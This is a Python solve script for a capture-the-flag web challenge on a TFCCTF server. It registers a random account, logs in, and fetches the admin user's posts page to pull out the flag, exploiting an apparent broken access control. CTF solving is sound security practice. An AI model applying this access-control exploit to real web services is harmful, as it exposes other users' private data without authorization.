#!/usr/bin/env python3
import requests, os, re

USERNAME, PASSWORD = os.urandom(10).hex(), os.urandom(10).hex()
BASEURL = f"http://challs.tfcctf.com:{input('Enter the port: ')}"
REGEX = r"TFCCTF{.*?}"

with requests.Session() as s:
    resp = s.post(f"{BASEURL}/api/register", 
        json = {'username':USERNAME, 'password':PASSWORD}
    )
    print(resp.text.strip())
    resp = s.post(f"{BASEURL}/api/login", 
        json = {'username':USERNAME, 'password':PASSWORD}
    )
    print(resp.text.strip())
    resp = s.get(f"{BASEURL}/posts/view/admin").text
    flag = re.findall(REGEX, resp)[0]
    print(flag)
        
